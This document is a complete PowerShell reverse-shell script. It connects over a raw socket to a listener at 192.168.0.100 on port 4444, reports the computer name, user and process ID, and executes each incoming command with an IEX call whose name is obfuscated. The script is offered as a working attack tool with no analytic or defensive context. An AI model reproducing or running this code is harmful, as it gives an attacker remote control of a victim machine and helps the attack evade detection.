# Raw Socket API Reverse Shell
# Uses System.Net.Sockets.Socket directly instead of TcpClient wrapper

$env:PS_EXEC = "I"+"E"+"X"
$srv = "192.168.0.100"
$prt = 4444

try {
    $sock = New-Object System.Net.Sockets.Socket(
        [System.Net.Sockets.AddressFamily]::InterNetwork,
        [System.Net.Sockets.SocketType]::Stream,
        [System.Net.Sockets.ProtocolType]::Tcp
    )
    $sock.Connect($srv, $prt)

    $ns = New-Object System.Net.Sockets.NetworkStream($sock)
    $sw = New-Object System.IO.StreamWriter($ns)
    $sw.AutoFlush = $true
    $sr = New-Object System.IO.StreamReader($ns)

    $sw.WriteLine("[+] Shell: $env:COMPUTERNAME\$env:USERNAME | PID: $PID")
    $sw.Write("PS $($srv):$($prt)> ")

    while ($sock.Connected) {
        $cmd = $sr.ReadLine()
        if ($cmd) {
            try {
                $exec = Get-ChildItem env:PS_EXEC | Select-Object -ExpandProperty Value
                $res = & $exec $cmd 2>&1 | Out-String
                $sw.WriteLine($res)
                $sw.Write("PS $($srv):$($prt)> ")
            } catch {
                $sw.WriteLine("ERR: " + $_.Exception.Message)
            }
        }
    }
} catch { exit }
finally { if ($sock) { $sock.Close() } }
